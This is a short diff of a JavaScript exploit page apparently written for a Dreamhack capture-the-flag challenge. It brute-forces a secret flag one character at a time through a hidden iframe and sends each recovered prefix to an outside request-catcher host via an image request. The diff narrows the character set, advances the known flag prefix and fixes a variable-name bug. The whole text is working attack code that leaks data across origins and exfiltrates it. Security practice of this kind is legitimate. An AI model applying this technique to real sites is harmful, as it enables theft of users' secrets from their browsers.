@@ -11,8 +11,8 @@
 <iframe id="iframe" style="display:none;"></iframe>
 <script>
     const iframe = document.getElementById("iframe");
-    const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
-    let flag = "DH{";
+    const chars = "abcdefghijklmnopqrstuvwxyz0123456789}";
+    let flag = "DH{22d1";
 
     async function searchChar(data) {
         return new Promise((resolve) => {
@@ -35,7 +35,7 @@
                     new Image().src = "https://qrnfmov.request.dreamhack.games?found=" + encodeURIComponent(flag);
                     found = true;
 
-                    if (char[i] === "}") return;
+                    if (chars[i] === "}") return;
                     break;
                 }
             }
